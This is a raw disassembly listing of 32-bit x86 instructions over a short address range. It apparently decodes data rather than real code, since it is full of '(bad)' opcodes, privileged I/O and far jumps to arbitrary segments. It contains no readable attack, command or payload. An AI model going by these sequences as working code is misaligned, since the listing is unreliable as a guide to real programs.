  42e40b:	jno    0x42e447
  42e40d:	loope  0x42e46b
  42e40f:	repz js 0x42e3e3
  42e412:	dec    edx
  42e413:	pop    edi
  42e414:	daa    
  42e415:	sub    BYTE PTR [ebp+ecx*4+0x4a9a8a8e],dl
  42e41c:	mov    edi,0xdc3c9e7f
  42e421:	sbb    DWORD PTR [ecx],edi
  42e423:	stos   DWORD PTR es:[edi],eax
  42e424:	cld    
  42e425:	in     eax,0xb2
  42e427:	outs   dx,BYTE PTR ds:[esi]
  42e428:	popf   
  42e429:	pop    edx
  42e42a:	es jne 0x42e474
  42e42d:	test   eax,0xca1d90ad
  42e432:	fs test eax,0x2fd4d301
  42e438:	call   0x66a2:0xd1805f3c
  42e43f:	in     al,0x6
  42e441:	mov    edi,0x561ba76e
  42e446:	std    
  42e447:	push   ss
  42e448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e449:	cmp    ebp,DWORD PTR [edx+0x1]
  42e44c:	clc    
  42e44d:	push   ebx
  42e44e:	jno    0x42e447
  42e450:	cmp    BYTE PTR [edi],cl
  42e452:	push   ss
  42e453:	lock inc esp
  42e455:	imul   ebx,ebp,0x62
  42e458:	and    ebp,DWORD PTR [edx+0x71]
  42e45b:	sti    
  42e45c:	mov    ds,WORD PTR [edi-0x10a294f8]
  42e462:	fldcw  WORD PTR [edi+eiz*1-0x3f12b155]
  42e469:	stos   BYTE PTR es:[edi],al
  42e46a:	sub    al,0xfc
  42e46c:	ins    DWORD PTR es:[edi],dx
  42e46d:	jae    0x42e46f
	...
  42e4d3:	add    BYTE PTR [eax],al
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	les    esi,FWORD PTR [edx]
  42e4e4:	lock test eax,0x1f067
  42e4ea:	add    BYTE PTR [ecx],al
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	cmp    al,0x6e
  42e4f0:	add    DWORD PTR [edx-0x3],0x4c
  42e4f4:	(bad)  
  42e4f5:	mov    al,0xcd
  42e4f7:	loope  0x42e569
  42e4f9:	fiadd  DWORD PTR [ebx+0x37]
  42e4fc:	jns    0x42e4b6
  42e4fe:	dec    edx
  42e4ff:	arpl   WORD PTR [edx],di
  42e501:	cmp    al,0x36
  42e503:	and    ebx,DWORD PTR [eax-0x65f8978f]
  42e509:	xchg   edx,eax
  42e50a:	or     BYTE PTR [ebx+eiz*8-0xf],0xa2
  42e50f:	and    DWORD PTR [esi],edi
  42e511:	and    ecx,esp
  42e513:	cmp    BYTE PTR [esi+0xe],al
  42e516:	aad    0x8f
  42e518:	data16 jns 0x42e4d8
  42e51b:	sbb    BYTE PTR [ebx],bh
  42e51d:	dec    ecx
  42e51e:	dec    eax
  42e51f:	hlt    
  42e520:	les    edi,FWORD PTR [edx]
  42e522:	jmp    0xd280:0xadbf
  42e528:	outs   dx,DWORD PTR ds:[esi]
  42e529:	sahf   
  42e52a:	xor    esi,esi
  42e52c:	sbb    BYTE PTR [ebx-0x2a],0x6f
  42e530:	push   edi
  42e531:	xchg   ecx,eax
  42e532:	not    DWORD PTR [esi+0x5b93fab5]
  42e538:	push   esi
  42e539:	cli    
  42e53a:	cmp    bl,BYTE PTR [esi]
  42e53c:	mov    ah,0xae
  42e53e:	fsubr  QWORD PTR [ebx+0x7]
  42e541:	and    esi,esi
  42e543:	cmp    DWORD PTR [ecx],0xffffff82
  42e546:	pop    edi
  42e547:	add    edx,DWORD PTR [esi]
  42e549:	add    eax,0xfe0d3e20
  42e54e:	mov    esp,0x8a8836c8
  42e553:	das    
  42e554:	mov    edx,0xaaa68b16
  42e559:	ja     0x42e5a3
  42e55b:	fld    DWORD PTR [ebp+eax*8+0xe7af754]
  42e562:	or     ebp,0x3abe6571
  42e568:	inc    BYTE PTR [ecx+0x736fca6d]
  42e56e:	jp     0x42e5be
  42e570:	xchg   edx,eax
  42e571:	(bad)  
  42e573:	dec    ecx
  42e574:	or     ah,BYTE PTR [edi+esi*1+0x7348ec5b]
  42e57b:	test   eax,0xabc09261
  42e580:	pop    es
  42e581:	mov    ecx,0x41bc8981
  42e586:	mov    edx,0xfd773936
  42e58b:	or     dl,BYTE PTR [esi+0x207b242e]
  42e591:	test   al,0xdb
  42e593:	test   al,0xb9
  42e595:	clc    
  42e596:	iret   
  42e597:	pop    esi
  42e598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e599:	jnp    0x42e5c1
  42e59b:	lahf   
  42e59c:	add    cl,BYTE PTR [ecx+0x4e]
  42e59f:	popa   
  42e5a0:	pop    ebp
  42e5a1:	retf   0x78a5
  42e5a4:	push   cs
  42e5a5:	mov    bl,0x53
  42e5a7:	cpuid  
  42e5a9:	pop    es
  42e5aa:	inc    edi
  42e5ab:	hlt    
  42e5ac:	jnp    0x42e582
  42e5ae:	fild   QWORD PTR [esi+0x2009a7cc]
  42e5b4:	mov    WORD PTR [ecx-0x33],fs
  42e5b7:	push   0xaf93770
  42e5bc:	fdiv   DWORD PTR [edi+0x17]
  42e5bf:	jge    0x42e5ad
  42e5c1:	add    eax,0x27f976b3
  42e5c6:	push   ebx
  42e5c7:	fld    QWORD PTR [esi]
  42e5c9:	data16 jmp 0x42e567
  42e5cc:	sbb    DWORD PTR [edi-0x6853cf3],edx
  42e5d2:	dec    ebp
  42e5d3:	ins    DWORD PTR es:[edi],dx
  42e5d4:	sub    al,0x21
  42e5d6:	push   ss
  42e5d7:	and    DWORD PTR [ebp-0xac643fa],esp
  42e5dd:	add    bh,BYTE PTR [eax]
  42e5df:	xor    edx,DWORD PTR [esi-0x3e]
  42e5e2:	or     BYTE PTR [eax+0x3e],ch
  42e5e5:	lods   eax,DWORD PTR ds:[esi]
  42e5e6:	and    edi,DWORD PTR [edi-0x4b]
  42e5e9:	out    dx,al
  42e5ea:	icebp  
  42e5eb:	ins    DWORD PTR es:[edi],dx
  42e5ec:	push   edi
  42e5ed:	test   DWORD PTR [eax],eax
	...
  42e653:	add    BYTE PTR [eax],al
  42e655:	add    BYTE PTR [ebp+0x38],dl
  42e658:	into   
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	loopne 0x42e5ec
  42e664:	fs popa 
  42e666:	addr16 icebp 
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	add    BYTE PTR [ecx],al
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	mov    bh,0x1
  42e670:	fisttp DWORD PTR [ecx]
  42e672:	jecxz  0x42e691
  42e674:	(bad)  
  42e675:	icebp  
  42e676:	push   ebp
  42e677:	ret    0x7741
  42e67a:	in     eax,dx
  42e67b:	or     edx,DWORD PTR [edi+0x55ae21a2]
  42e681:	push   0x66
  42e683:	inc    ebx
  42e684:	sbb    ecx,DWORD PTR [ebx+0x54b250d8]
  42e68a:	xor    al,0xf
  42e68c:	loope  0x42e623
  42e68e:	dec    esi
  42e68f:	ret    0x7aa3
  42e692:	clc    
  42e693:	adc    al,BYTE PTR [ebx+0x10]
  42e696:	and    eax,0xefc9c8df
  42e69b:	mov    eax,0x63c9a74d
  42e6a0:	push   cs
  42e6a1:	jl     0x42e62d
  42e6a3:	test   eax,0x5a8794c3
  42e6a8:	cmp    DWORD PTR [edx+ebp*2-0x7a1e6f4d],ebx
  42e6af:	sbb    BYTE PTR [ebp-0x54],0x67
  42e6b3:	inc    ebp
  42e6b4:	dec    edx
  42e6b5:	inc    eax
  42e6b6:	sbb    esp,eax
  42e6b8:	jbe    0x42e675
  42e6ba:	pop    ebp
  42e6bb:	leave  
  42e6bc:	adc    BYTE PTR ds:0x3d568579,bl
  42e6c2:	pushf  
  42e6c3:	in     al,dx
  42e6c4:	js     0x42e6c8
  42e6c6:	pop    ebx
  42e6c7:	pusha  
  42e6c8:	daa    
  42e6c9:	xchg   ebp,eax
  42e6ca:	or     al,0x4a
  42e6cc:	lahf   
  42e6cd:	cmc    
  42e6ce:	ret    
  42e6cf:	xor    bh,0xf3
  42e6d2:	iret   
  42e6d3:	push   0x7b
  42e6d5:	lahf   
  42e6d6:	xchg   ebx,eax
  42e6d7:	sbb    dh,BYTE PTR [ebp+0x3f58cbf6]
  42e6dd:	test   DWORD PTR [ebx+eax*1+0x6c],edx
  42e6e1:	popa   
  42e6e2:	adc    dh,BYTE PTR [edx]
  42e6e4:	frstor [ebp-0x4d07988f]
  42e6ea:	fsubr  QWORD PTR [edi+0x50a7570d]
  42e6f0:	sbb    edi,DWORD PTR [ecx-0x6411e828]
  42e6f6:	cmp    BYTE PTR [ebx-0x46],cl
  42e6f9:	pop    esi
  42e6fa:	cs js  0x42e6dc
  42e6fd:	mov    ebx,DWORD PTR [edx+0x2d]
  42e700:	repz jne 0x42e6e4
  42e703:	cwde   
  42e704:	fwait
  42e705:	or     al,0x5
  42e707:	fs fadd st,st(7)
  42e70a:	outs   dx,BYTE PTR ds:[esi]
  42e70b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e70c:	push   cs
  42e70d:	push   edx
  42e70e:	add    DWORD PTR [edi-0x7c],esp
  42e711:	pop    ebx
  42e712:	push   es
  42e713:	push   ebp
  42e714:	inc    edx
  42e715:	jb     0x42e6b7
  42e717:	mov    bl,0xf9
  42e719:	mov    dh,BYTE PTR [esi]
  42e71b:	sbb    bl,BYTE PTR [ebx+0x54]
  42e71e:	push   es
  42e71f:	loope  0x42e70a
  42e721:	test   BYTE PTR [ecx-0x20],cl
  42e724:	aam    0xb7
  42e726:	pushw  0xff8d
  42e729:	(bad)  
  42e72a:	in     eax,0x19
  42e72c:	(bad)  [eax-0x5e838b27]
  42e732:	daa    
  42e733:	lea    ecx,[esi+edx*8-0x5197aea2]
  42e73a:	fwait
  42e73b:	jl     0x42e6ec
  42e73d:	sub    ecx,ebp
  42e73f:	xchg   esp,eax
  42e740:	jbe    0x42e7c0
  42e742:	das    
  42e743:	icebp  
  42e744:	loope  0x42e71d
  42e746:	push   cs
  42e747:	stos   BYTE PTR es:[edi],al
  42e748:	jmp    0x7eebfcd0
  42e74d:	jbe    0x42e711
  42e74f:	mov    ch,0xa8
  42e751:	sbb    eax,0x7bd30439
  42e756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e757:	fwait
  42e758:	icebp  
  42e759:	jmp    0x2a9c:0xad3d27a6
  42e760:	into   
  42e761:	lahf   
  42e762:	cwde   
  42e763:	stos   BYTE PTR es:[edi],al
  42e764:	push   ebp
  42e765:	mov    bh,0xe7
  42e767:	retf   
  42e768:	mov    cs,WORD PTR [ebx-0x67b1c405]
	...
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	(bad)  
  42e7e3:	adc    eax,0xf267fb0a
  42e7e8:	add    DWORD PTR [eax],eax
  42e7ea:	add    BYTE PTR [ecx],al
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	aad    0x45
  42e7f0:	in     eax,dx
  42e7f1:	jl     0x42e7c1
  42e7f3:	mov    eax,ds:0x7458c188
  42e7f8:	mov    ds:0xfe62d8a3,eax
  42e7fd:	or     eax,0x4f661e39
  42e802:	dec    ebp
  42e803:	stos   DWORD PTR es:[edi],eax
  42e804:	pushf  
  42e805:	pop    esi
  42e806:	cmp    eax,0x211c998d
  42e80b:	push   ecx
  42e80c:	mov    esi,0x5da1df47
  42e811:	jo     0x42e7d7
  42e813:	sub    eax,0x426771d6
  42e818:	test   al,0x14
  42e81a:	and    DWORD PTR [ebx+0xa],eax
  42e81d:	aad    0xa8
  42e81f:	mov    esi,0x7f958f00
  42e824:	push   eax
  42e825:	fs lock pop es
  42e828:	or     eax,0x70c2aa64
  42e82d:	ins    BYTE PTR es:[edi],dx
  42e82e:	mov    dl,0xed
  42e830:	aaa    
  42e831:	fisttp WORD PTR [edx+eiz*8]
  42e834:	mov    ds:0xe0482ef4,eax
  42e839:	xor    edi,DWORD PTR [ecx+eiz*4+0x59]
  42e83d:	push   es
  42e83e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e83f:	and    ch,dh
  42e841:	cli    
  42e842:	fld    QWORD PTR [eax+0x47c0202e]
  42e848:	adc    esi,edx
  42e84a:	js     0x42e87b
  42e84c:	fs icebp 
  42e84e:	xchg   ecx,esi
  42e850:	mov    ch,BYTE PTR [esi-0x35]
  42e853:	fsqrt  
  42e855:	sub    eax,0x4584eb8
  42e85a:	retf   0xa63e
  42e85d:	call   0x1cb2:0xe4714d2a
  42e864:	call   0x3a04:0x5d3a532b
  42e86b:	xchg   ebx,eax
  42e86c:	stos   BYTE PTR es:[edi],al
  42e86d:	jns    0x42e810
  42e86f:	mov    esp,0xd4440636
  42e874:	mov    ah,BYTE PTR [edx+edx*1-0x73]
  42e878:	add    DWORD PTR ss:[eax-0x5a],esp
  42e87c:	data16 jmp 0x42e8ea
  42e87f:	cmp    eax,0xb7c7e41e
  42e884:	setae  dh
  42e887:	and    edi,DWORD PTR [edi+0x3e1f5691]
  42e88d:	dec    ebx
  42e88e:	cmp    DWORD PTR [edi+0x4b29fb9c],esi
  42e894:	xchg   ebx,eax
  42e895:	add    al,0x9a
  42e897:	adc    bl,BYTE PTR [esi]
  42e899:	outs   dx,WORD PTR ds:[esi]
  42e89b:	adc    DWORD PTR [edi+0x61],ebp
  42e89e:	cmp    DWORD PTR [edx+esi*2+0x1],0x6
  42e8a3:	jmp    0x1e79:0xa05556e8
  42e8aa:	mov    ds:0xa2598d02,eax
  42e8af:	pop    ds
  42e8b0:	push   cs
  42e8b1:	or     DWORD PTR [ebx-0x19968684],esp
  42e8b7:	xor    DWORD PTR [esi],0x6821eb83
  42e8bd:	add    al,BYTE PTR [ecx+esi*8-0x6]
  42e8c1:	jns    0x42e923
  42e8c3:	or     dh,al
  42e8c5:	inc    esi
  42e8c6:	iret   
  42e8c7:	sbb    al,0x7c
  42e8c9:	retf   
  42e8ca:	retf   
  42e8cb:	not    DWORD PTR [ebx]
  42e8cd:	add    DWORD PTR [esi],edi
  42e8cf:	enter  0x63ab,0xac
  42e8d3:	shl    DWORD PTR [ebx],1
  42e8d5:	xor    esp,ebp
  42e8d7:	sahf   
  42e8d8:	loop   0x42e920
  42e8da:	xor    ch,ch
  42e8dc:	xchg   ecx,eax
  42e8dd:	rcl    al,1
  42e8df:	xor    DWORD PTR [ebx],ebx
  42e8e1:	gs iret 
  42e8e3:	jo     0x42e904
  42e8e5:	push   cs
  42e8e6:	xor    al,0xcb
  42e8e8:	inc    edx
  42e8e9:	or     BYTE PTR [ebx+0x21],dh
  42e8ec:	jo     0x42e95f
	...
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x78dc07d5]
  42e963:	jl     0x42e92e
  42e965:	test   eax,0x1f367
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	call   0xfe9e:0xeb9a8260
  42e975:	cwde   
  42e976:	push   esi
  42e977:	jecxz  0x42e917
  42e979:	cmp    ebx,DWORD PTR [ebp+0x69517dde]
  42e97f:	cli    
  42e980:	ds cwde 
  42e982:	sub    DWORD PTR [ecx+0x7c74a174],eax
  42e988:	pop    ebx
  42e989:	sub    BYTE PTR [edi+0x1],ah
  42e98c:	dec    edx
  42e98d:	or     bh,ah
  42e98f:	sub    dl,BYTE PTR [edx-0x6926c1f9]
  42e995:	sbb    eax,0xb5cfaea4
  42e99a:	sub    DWORD PTR [ebx-0x78b406d8],edi
  42e9a0:	cs hlt 
  42e9a2:	push   0xef0a8209
  42e9a7:	xchg   ecx,eax
  42e9a8:	mov    al,0xdb
  42e9aa:	jo     0x42e9c9
  42e9ac:	xchg   ebp,eax
  42e9ad:	es inc edx
  42e9af:	add    ch,BYTE PTR [ebx-0x20]
  42e9b2:	lds    edi,FWORD PTR [edx+0x21be1255]
  42e9b8:	test   BYTE PTR [edx-0x6766532a],0x86
  42e9bf:	int3   
  42e9c0:	and    DWORD PTR [ebp+eax*4-0x61338be1],ebx
  42e9c7:	push   ebx
  42e9c8:	gs test al,0x7d
  42e9cb:	mov    dh,0x52
  42e9cd:	xor    eax,0x52357d30
  42e9d2:	inc    esi
  42e9d3:	adc    edi,esp
  42e9d5:	test   ecx,esp
  42e9d7:	sbb    DWORD PTR [ebx+eiz*8],ebx
  42e9da:	loopne 0x42ea42
  42e9dc:	loopne 0x42ea08
  42e9de:	sbb    ecx,DWORD PTR [edx+0x6e]
  42e9e1:	ret    0x56f5
  42e9e4:	leave  
  42e9e5:	fmul   st,st(6)
  42e9e7:	mov    al,ds:0x61c5609d
  42e9ec:	push   eax
  42e9ed:	les    ebp,FWORD PTR [esi+0x20ee0ed9]
  42e9f3:	xor    edi,DWORD PTR [ecx+0x37]
  42e9f6:	mov    dl,0x4
  42e9f8:	mov    esi,0x79a6c5e3
  42e9fd:	inc    ebx
  42e9fe:	push   ss
  42e9ff:	sar    BYTE PTR [edi+0x45],1
  42ea02:	cmp    eax,0x79ea68d7
  42ea07:	scas   al,BYTE PTR es:[edi]
  42ea08:	aas    
  42ea09:	(bad)  
  42ea0a:	and    al,0x96
  42ea0c:	fsub   DWORD PTR [esi+0x4a]
  42ea0f:	test   al,0xed
  42ea11:	sahf   
  42ea12:	sbb    al,0xc4
  42ea14:	out    dx,al
  42ea15:	shr    DWORD PTR [ebx+0x7c],0xbb
  42ea19:	hlt    
  42ea1a:	retf   
  42ea1b:	pop    esi
  42ea1c:	pop    eax
  42ea1d:	out    0x1d,al
  42ea1f:	push   esp
  42ea20:	add    ah,BYTE PTR [eax]
  42ea22:	arpl   bx,sp
  42ea24:	aaa    
  42ea25:	pop    esi
  42ea26:	add    BYTE PTR [eax+0x2e],dh
  42ea29:	loopne 0x42ea03
  42ea2b:	inc    DWORD PTR [esi-0x2d445066]
  42ea31:	das    
  42ea32:	inc    eax
  42ea33:	sbb    esp,esi
  42ea35:	adc    ebp,edi
  42ea37:	xchg   edi,eax
  42ea38:	hlt    
  42ea39:	cld    
  42ea3a:	shl    BYTE PTR [ecx+0x5d],cl
  42ea3d:	inc    edx
  42ea3e:	add    ecx,eax
  42ea40:	add    dl,BYTE PTR [ebx]
  42ea42:	xchg   ecx,eax
  42ea43:	mov    ds:0x2abf7afc,al
  42ea48:	add    BYTE PTR [esp+eiz*2+0x33be1c7b],al
  42ea4f:	xor    cl,BYTE PTR [ecx+0x6db0f35]
  42ea55:	ds cmp eax,0xe3fdb558
  42ea5b:	into   
  42ea5c:	mov    esi,0xa7ee0ed7
  42ea61:	(bad)  
  42ea62:	leave  
  42ea63:	adc    DWORD PTR ds:0x8e174013,eax
  42ea69:	ds add ah,dh
  42ea6c:	pop    esi
  42ea6d:	test   DWORD PTR [eax],0x0
	...
  42ead3:	add    BYTE PTR [eax],al
  42ead5:	add    ch,ah
  42ead7:	mov    edx,0xebdfe392
  42eadc:	cmc    
  42eadd:	mov    esi,0x66dc160c
  42eae2:	pop    ecx
  42eae3:	rcl    DWORD PTR [ebp+edx*2+0x67],1
  42eae7:	hlt    
  42eae8:	add    DWORD PTR [eax],eax
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	or     DWORD PTR [edi-0x43],eax
  42eaf1:	shl    BYTE PTR [ebx-0x47],0x2d
  42eaf5:	mov    dh,0x71
  42eaf7:	cdq    
  42eaf8:	nop
  42eaf9:	in     eax,0x82
  42eafb:	add    eax,0x92837541
  42eb00:	dec    edx
  42eb01:	mov    dl,0x15
  42eb03:	cli    
  42eb04:	xor    ebp,DWORD PTR [ecx]
  42eb06:	push   es
  42eb07:	or     BYTE PTR [eax+0x15d4e956],ah
  42eb0d:	fisub  WORD PTR [edx-0x48]
  42eb10:	(bad)  [ecx+0x20]
  42eb13:	mov    bh,0x25
  42eb15:	es in  eax,0x6c
  42eb18:	push   ebp
  42eb19:	ins    DWORD PTR es:[edi],dx
  42eb1a:	mov    bh,0x66
  42eb1c:	lods   al,BYTE PTR ds:[esi]
  42eb1d:	loop   0x42eade
  42eb1f:	and    dl,BYTE PTR ds:0xb66c6e02
  42eb25:	loopne 0x42eb1e
  42eb27:	call   0x30f6:0x6254ff1e
  42eb2e:	xor    eax,0xe5e2a607
  42eb33:	jno    0x42eb1f
  42eb35:	add    eax,0x632fb8a4
  42eb3a:	fs sub eax,0xaf8ba8e1
  42eb40:	pop    eax
  42eb41:	ins    DWORD PTR es:[edi],dx
  42eb42:	xchg   DWORD PTR [edi],ebx
  42eb44:	repz inc edx
  42eb46:	push   edx
  42eb47:	enter  0x500e,0x82
  42eb4b:	adc    DWORD PTR [ebp-0x78],edx
  42eb4e:	ror    DWORD PTR [esi+0x78fabe63],0xe3
  42eb55:	sbb    al,bl
  42eb57:	mov    eax,DWORD PTR [esi]
  42eb59:	into   
  42eb5a:	pop    eax
  42eb5b:	cmp    al,0x9d
  42eb5d:	inc    ecx
  42eb5e:	mov    esp,0x4294ee77
  42eb63:	cli    
  42eb64:	fild   WORD PTR [edx+eiz*4]
  42eb67:	fs push ebx
  42eb69:	jg     0x42eb42
  42eb6b:	js     0x42eaf1
  42eb6d:	inc    eax
  42eb6e:	push   eax
  42eb6f:	or     al,BYTE PTR [esi-0x72929139]
  42eb75:	outs   dx,BYTE PTR ds:[esi]
  42eb76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb77:	push   ecx
  42eb78:	sub    eax,0x14920e85
  42eb7d:	sbb    DWORD PTR [edi+0x6f],0xf7247042
  42eb84:	imul   edx,DWORD PTR [eax-0x13b580ae],0xfffffffc
  42eb8b:	xor    BYTE PTR [edx+0x2],dl
  42eb8e:	or     DWORD PTR [edi-0x2906c54f],esp
  42eb94:	mov    esi,0x1e9568c2
  42eb99:	loope  0x42ec17
  42eb9b:	stc    
  42eb9c:	ins    DWORD PTR es:[edi],dx
  42eb9d:	outs   dx,BYTE PTR ds:[esi]
  42eb9e:	das    
  42eb9f:	imul   eax,DWORD PTR [ecx],0x3e
  42eba2:	fwait
  42eba3:	xchg   ecx,eax
  42eba4:	popa   
  42eba5:	jecxz  0x42ebe2
  42eba7:	xor    cl,BYTE PTR [esi]
  42eba9:	inc    esp
  42ebab:	and    al,0x66
  42ebad:	dec    ebx
  42ebae:	inc    edi
  42ebaf:	sbb    al,0x77
  42ebb1:	rep ins DWORD PTR es:[edi],dx
  42ebb3:	data16 jp 0x42ec19
  42ebb6:	out    dx,al
  42ebb7:	jno    0x42ebb4
  42ebb9:	mov    edi,0xcacd5f50
  42ebbe:	scas   eax,DWORD PTR es:[edi]
  42ebbf:	std    
  42ebc0:	jne    0x42ebc9
  42ebc2:	js     0x42eba4
  42ebc4:	sbb    ch,bh
  42ebc6:	dec    eax
  42ebc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ebc8:	cmp    DWORD PTR [ebx],ecx
  42ebca:	test   al,0x6f
  42ebcc:	cwde   
  42ebcd:	jle    0x42ec1e
  42ebcf:	mov    al,ds:0x685dd131
  42ebd4:	jns    0x42eba3
  42ebd6:	dec    edx
  42ebd7:	pop    ds
  42ebd8:	aaa    
  42ebd9:	or     al,0xec
  42ebdb:	mov    ecx,0x8a16e630
  42ebe0:	das    
  42ebe1:	xchg   esi,eax
  42ebe2:	(bad)  
  42ebe3:	xor    DWORD PTR ss:[edi-0x345f6f23],ebp
  42ebea:	retf   
  42ebeb:	xor    eax,0x2e
	...
  42ec55:	add    BYTE PTR [esi+0x41],bh
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	sub    edi,0x670b356d
  42ec67:	cmc    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	dec    edi
  42ec6f:	xor    edi,DWORD PTR [eax]
  42ec71:	jecxz  0x42eca9
  42ec73:	out    0xb0,al
  42ec75:	scas   al,BYTE PTR es:[edi]
  42ec76:	add    dh,ah
  42ec78:	add    al,BYTE PTR [esp+eax*1+0x4]
  42ec7c:	(bad)  
  42ec7d:	jns    0x42ec20
  42ec7f:	repz (bad) 
  42ec81:	push   esi
  42ec82:	xor    DWORD PTR [eax+0x7167955],ebp
  42ec88:	adc    al,0x9b
  42ec8a:	mov    ch,0x8
  42ec8c:	sti    
  42ec8d:	rcl    BYTE PTR [edi-0x79],1
  42ec90:	pop    esp
  42ec91:	add    BYTE PTR [ebp-0x66],dh
  42ec94:	add    DWORD PTR [ebx-0x492d805c],ebp
  42ec9a:	mov    ch,0x11
  42ec9c:	add    eax,0xbd9d4705
  42eca1:	cmp    BYTE PTR [eax+0x2],al
  42eca4:	xor    al,0x68
  42eca6:	ins    BYTE PTR es:[edi],dx
  42eca7:	loop   0x42ec5b
  42eca9:	mov    edx,0x8bb3cc58
  42ecae:	pmaxsw mm3,QWORD PTR gs:[edi]
  42ecb2:	outs   dx,BYTE PTR ds:[esi]
  42ecb3:	ja     0x42ecae
  42ecb5:	in     eax,dx
  42ecb6:	lock pop edi
  42ecb8:	jg     0x42ed0e
  42ecba:	stos   DWORD PTR es:[edi],eax
  42ecbb:	outs   dx,BYTE PTR ds:[esi]
  42ecbc:	(bad)  
  42ecbd:	xor    eax,0x646b40
  42ecc2:	cs adc eax,0x6c3e640b
  42ecc8:	out    0xfb,al
  42ecca:	ds jno 0x42ec80
  42eccd:	sbb    BYTE PTR [esi+0x32],ch
  42ecd0:	inc    esp
  42ecd1:	repz (bad) 
  42ecd3:	scas   eax,DWORD PTR es:[edi]
  42ecd4:	sbb    DWORD PTR [edi],esi
  42ecd6:	and    DWORD PTR [ebp-0x11],edx
  42ecd9:	call   0x541:0xc5cdc32e
  42ece0:	mov    ebp,DWORD PTR [ecx+0x3d]
  42ece3:	popa   
  42ece4:	mov    ah,0xd8
  42ece6:	mov    dl,0xb6
  42ece8:	out    dx,al
  42ece9:	std    
  42ecea:	cmc    
  42eceb:	pop    ebx
  42eced:	out    0x16,al
  42ecef:	fs dec ecx
  42ecf1:	push   0xffffff8b
  42ecf3:	and    al,0xe6
  42ecf5:	and    eax,0x6d2e1f04
  42ecfa:	cmp    al,BYTE PTR [esi-0x47]
  42ecfd:	fs sub ch,bl
  42ed00:	pop    ebp
  42ed01:	dec    ebx
  42ed02:	add    eax,0x113dc7d2
  42ed07:	sub    dh,BYTE PTR [edx]
  42ed09:	xchg   esp,eax
  42ed0a:	out    0x33,al
  42ed0c:	dec    edi
  42ed0d:	dec    edi
  42ed0e:	mov    bh,0x4f
  42ed10:	(bad)  [edx-0x4c3ab2f9]
  42ed16:	jb     0x42ed29
  42ed18:	cmp    eax,0x882db29
  42ed1d:	aaa    
  42ed1e:	aas    
  42ed1f:	popf   
  42ed20:	cmp    eax,DWORD PTR [ebx+0x10]
  42ed23:	mov    esi,fs
  42ed25:	inc    esi
  42ed26:	dec    esi
  42ed27:	imul   esp,ebp,0xffffff9a
  42ed2a:	into   
  42ed2b:	(bad)  
  42ed2c:	sub    al,0x97
  42ed2e:	pop    ds
  42ed2f:	mov    esp,0x5c7d6d83
  42ed34:	clc    
  42ed35:	pop    esi
  42ed36:	jg     0x42ecbf
  42ed38:	mov    edi,0x878b5eb4
  42ed3d:	shr    BYTE PTR [edi+0x4a6eea74],cl
  42ed43:	push   ds
  42ed44:	add    DWORD PTR [ecx],0xffffff81
  42ed47:	push   edx
  42ed48:	push   ecx
  42ed49:	xchg   ebp,eax
  42ed4a:	loopne 0x42edb9
  42ed4c:	ret    0x61b9
  42ed4f:	xor    al,0x92
  42ed51:	iret   
  42ed52:	pop    eax
  42ed53:	sub    bh,cl
  42ed55:	dec    edi
  42ed56:	fdiv   st,st(5)
  42ed58:	inc    eax
  42ed59:	in     al,0x53
  42ed5b:	in     eax,dx
  42ed5c:	dec    BYTE PTR [ebp-0x7920ac32]
  42ed62:	outs   dx,DWORD PTR ds:[esi]
  42ed63:	das    
  42ed64:	add    eax,0xb084898e
  42ed69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ed6a:	cmp    ecx,DWORD PTR [esi]
  42ed6c:	or     eax,0xc2
	...
  42edd5:	add    BYTE PTR [edx],ch
  42edd7:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42eddd:	mul    bl
  42eddf:	xor    al,BYTE PTR [ebp+0x5b7927a2]
  42ede5:	into   
  42ede6:	test   BYTE PTR [bx+di],0x0
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	push   edi
  42edef:	pop    es
  42edf0:	fwait
  42edf1:	lods   eax,DWORD PTR ds:[esi]
  42edf2:	rol    DWORD PTR [edx+0x12a4a258],cl
  42edf8:	jnp    0x42edb8
  42edfa:	bnd jbe 0x42edd7
  42edfd:	add    eax,0xc2926fe4
  42ee02:	int    0x32
  42ee04:	mov    edx,DWORD PTR [ebx]
  42ee06:	sar    DWORD PTR cs:[edi],0xf5
  42ee0a:	dec    edi
  42ee0b:	sub    BYTE PTR gs:[ecx],al
  42ee0e:	fcom   QWORD PTR [ecx-0x36]
  42ee11:	sahf   
  42ee12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee13:	mov    eax,ds:0xac996de4
  42ee18:	(bad)  
  42ee19:	cmp    al,0x75
